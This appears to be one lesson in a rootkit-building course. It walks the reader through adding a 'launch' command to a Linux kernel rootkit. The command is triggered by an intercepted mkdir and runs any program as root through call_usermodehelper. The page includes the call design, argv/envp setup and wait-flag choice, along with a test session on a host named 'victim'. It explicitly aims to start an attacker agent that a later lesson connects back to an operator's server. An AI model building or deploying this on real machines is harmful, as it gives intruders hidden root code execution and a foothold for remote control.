# L14: Usermode Helper

## Mission

Add a `launch` control that starts an absolute executable path as root from the
kernel.
You will prove it by launching a script that creates `/tmp/proof`.

M01 gave you a complete local rootkit.
Every command requires typing mkdir in a shell on the target.
That means you need shell access first, and you type every command by hand.

The kernel can launch programs on its own.
If the kernel can start an agent binary, you never need to type another command.

## What you will observe

Creating `rklings.launch.<absolute-path>` returns through the intercepted mkdir
call while a kernel work item starts that path as a separate root process.
The proof file appears only when the userspace program actually executes;
existing ping and escalation controls must continue to work.

## Workspace

The exercise carries the M01 module forward and adds one editable component:

```text
exercises/L14-usermode-helper
├── Kbuild
├── core
│   ├── dispatch.c
│   ├── escalation.c
│   ├── filter.c
│   ├── init.c
│   ├── launch.c
│   ├── module.c
│   └── target.c
└── include
    └── rootkit.h
```

The dispatcher and existing controls are provided.
Implement only the launch handler and its registration.

## call_usermodehelper

The kernel uses `call_usermodehelper` to run userspace programs.
It is the same mechanism the kernel uses to load firmware and run modprobe.
You control the binary path, arguments, and environment.

```text
  mkdir("rklings.launch./tmp/agent")
       |
       v
  kretprobe entry
       |  parse "launch" command, arg = "/tmp/agent"
       |
       v
  call_usermodehelper("/tmp/agent", argv, envp, UMH_WAIT_EXEC)
       |
       v
  kernel spawns /tmp/agent as a new process
  (parent is kthreadd, PID 2)
```

The function signature:

```c
int call_usermodehelper(const char *path,
                        char **argv,
                        char **envp,
                        int wait);
```

`wait` controls blocking behavior:

- `UMH_WAIT_EXEC`: return after exec (not after the process exits).
  The process runs in the background.
- `UMH_WAIT_PROC`: block until the process exits.
  Never use this in a syscall handler: it deadlocks.
- `UMH_NO_WAIT`: fire and forget.
  No error reporting if exec fails.

`UMH_WAIT_EXEC` is the right choice.
It confirms the binary exists and is executable, then returns.

## argv and envp

Both are NULL-terminated string arrays, just like execve.
The first element of argv is the program name (convention: same as path).

```c
char *argv[] = { "/tmp/agent", NULL };
char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/bin", NULL };
```

The environment must include PATH or the process inherits an empty environment.
Minimal is fine: HOME and PATH.

## The mkdir command

`rklings.launch.<path>` triggers the launch.
The argument after "launch." is the absolute path to the binary.
Dots in the path work because the dispatcher uses longest-prefix matching:
"launch" matches, everything after the first dot is the argument.

```text
rklings.launch./tmp/agent    -> launch "/tmp/agent"
rklings.launch./bin/echo     -> launch "/bin/echo"
```

## Implement it

`core/launch.c` (one focused handler added to the complete M01 base):

- `cmd_launch(const char *arg)`: validate path starts with "/", build argv/envp,
  call_usermodehelper
- `rk_launch_init()`: register `launch` in the command registry

### Interfaces used here

```c
#include <linux/umh.h>

int call_usermodehelper(const char *path, char **argv, char **envp, int wait);

// Wait flags
UMH_WAIT_EXEC   // return after exec starts
UMH_WAIT_PROC   // block until process exits (NEVER in syscall context)
UMH_NO_WAIT     // fire and forget
```

## Test it

```
$ ./rklings run L14
root@victim:~# insmod /rklings/rklings.ko
root@victim:~# printf '%s\n' '#!/bin/sh' \
  'echo launched > /tmp/proof' > /tmp/test.sh
root@victim:~# chmod +x /tmp/test.sh
root@victim:~# mkdir rklings.launch./tmp/test.sh && echo "exit: $?"
exit: 0
root@victim:~# cat /tmp/proof
launched
root@victim:~# dmesg | tail -2
rklings: launch: /tmp/test.sh
rklings: launch: ret=0
```

The process runs as root (kernel context).
Its parent is kthreadd (PID 2), not the shell.

```
root@victim:~# ps -eo pid,ppid,comm | grep test
  412     2 test.sh
```

## Validate

```
$ ./rklings validate L14
  [+] module loads
  [+] mkdir rklings.launch./tmp/test.sh spawns process
  [+] launched process created /tmp/proof
  [+] ping command still works
  [+] escalation command still works
  PASS
```

## Next

The module can start a userspace program, but that program cannot reach an
operator yet.
G00 qualifies the Go and stream-I/O mechanics used by that program.
L15 then builds an authenticated callback so the target can connect to your
server.
